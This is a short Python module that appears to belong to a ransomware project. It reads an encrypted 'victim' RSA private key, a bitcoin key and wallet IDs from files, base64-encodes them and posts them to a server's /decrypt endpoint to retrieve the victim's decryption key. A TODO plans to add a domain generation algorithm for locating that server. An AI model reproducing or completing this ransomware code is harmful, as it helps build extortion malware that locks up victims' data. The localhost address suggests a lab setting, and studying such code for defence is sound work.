import logging
import requests
import utils
from base64 import b64encode, b64decode
from config import (
    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    ENCRYPTED_BITCOIN_KEY_LOCATION,
    BITCOIN_WALLET_ID_PATH,
)

logger = logging.getLogger(__name__)

def build_request():
    logger.info("Building Request")
    
    encrypted_local_rsa_key_parts = utils.read_data_from_file(
        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False
    )

    encrypted_bitcoin_key_parts = utils.read_data_from_file(
        ENCRYPTED_BITCOIN_KEY_LOCATION, serialized=False
    )
    body = {
        "victim_private_key": [
            b64encode(part).decode("ascii") for part in encrypted_local_rsa_key_parts
        ],
        "my_bitcoin_private_key": [
            b64encode(part).decode("ascii") for part in encrypted_bitcoin_key_parts
        ],
        "my_wallet_id": b64encode(
            utils.read_data_from_file(BITCOIN_WALLET_ID_PATH.encode("utf-8"))
        ).decode("ascii"),
        "victim_wallet_id": "",
    }

    return body


def send_request(server, body):
    logger.info(f"Sending request to {server}")
    response = requests.post(url=f"{server}/decrypt", json=body).json()
    return b64decode(response.get("key"))


def get_decrypted_key_from_server():
    # TODO: ADD DGA Algorithm
    body = build_request()
    key = send_request(server="http://localhost:5000", body=body)
    return key

